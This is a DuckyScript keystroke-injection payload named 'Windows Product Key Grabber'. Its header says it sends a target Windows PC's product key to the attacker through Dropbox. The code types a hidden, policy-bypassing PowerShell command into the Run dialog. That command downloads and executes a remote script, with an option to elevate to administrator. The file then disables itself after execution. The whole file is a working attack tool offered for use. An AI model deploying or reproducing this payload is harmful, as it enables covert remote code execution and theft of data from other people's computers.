REM_BLOCK INFOS
    Title: Windows Product Key Grabber
    Version: 1.0
    Author: Who-Is-Julien
    Description: This payload sends you the target PC's Windows product key via Dropbox.
    Target: Windows 10, 11
    Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Payloads/Windows-Product-Key-Grabber/README.md
END_REM

EXTENSION RUN_HOSTED_POWERSHELL
    REM_BLOCK INFOS
        Title: Run Hosted PowerShell
        Version: 1.0
        Author: Who-Is-Julien
        Description: This extension executes a hosted PowerShell script using the Windows Run dialog box.
        Target: Windows 10, 11
        Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Extensions/Run_Hosted_PowerShell/README.md
    END_REM

    REM Required options:
    DEFINE #SCRIPT_URL example.com

    REM Advanced options:
    DEFINE #ACTIVE_DETECTION FALSE
    DEFINE #DETECTION_MAX_TRIES 200
    DEFINE #DETECTION_CHECK_INTERVAL 20
    DEFINE #SHORT_DELAY 500
    DEFINE #MEDIUM_DELAY 2000
    DEFINE #ELEVATED_EXECUTION FALSE
    DEFINE #DISABLE_AFTER_EXECUTION TRUE

    IF ( #ACTIVE_DETECTION == TRUE ) THEN
        VAR $MAX_TRIES = #DETECTION_MAX_TRIES
        WHILE (($_CAPSLOCK_ON == FALSE) && ($MAX_TRIES > 0))
            CAPSLOCK
            DELAY #DETECTION_CHECK_INTERVAL
            $MAX_TRIES = ($MAX_TRIES - 1)
        END_WHILE
        CAPSLOCK
    ELSE THEN
        VAR $MAX_TRIES = #DETECTION_MAX_TRIES
        WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
            DELAY #DETECTION_CHECK_INTERVAL
            $MAX_TRIES = ($MAX_TRIES - 1)
        END_WHILE
    END_IF
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > 2) THEN
        GUI r
        DELAY #MEDIUM_DELAY
        STRING PowerShell -W H -EX Bypass "IWR -UseB '#SCRIPT_URL' | IEX"
        IF ( #ELEVATED_EXECUTION == TRUE ) THEN
            DELAY #SHORT_DELAY
            CTRL SHIFT ENTER
            DELAY #SHORT_DELAY
            LEFT
        END_IF
        DELAY #SHORT_DELAY
        ENTER
    END_IF
    IF ( #DISABLE_AFTER_EXECUTION == TRUE ) THEN
        ATTACKMODE OFF
    END_IF
END_EXTENSION
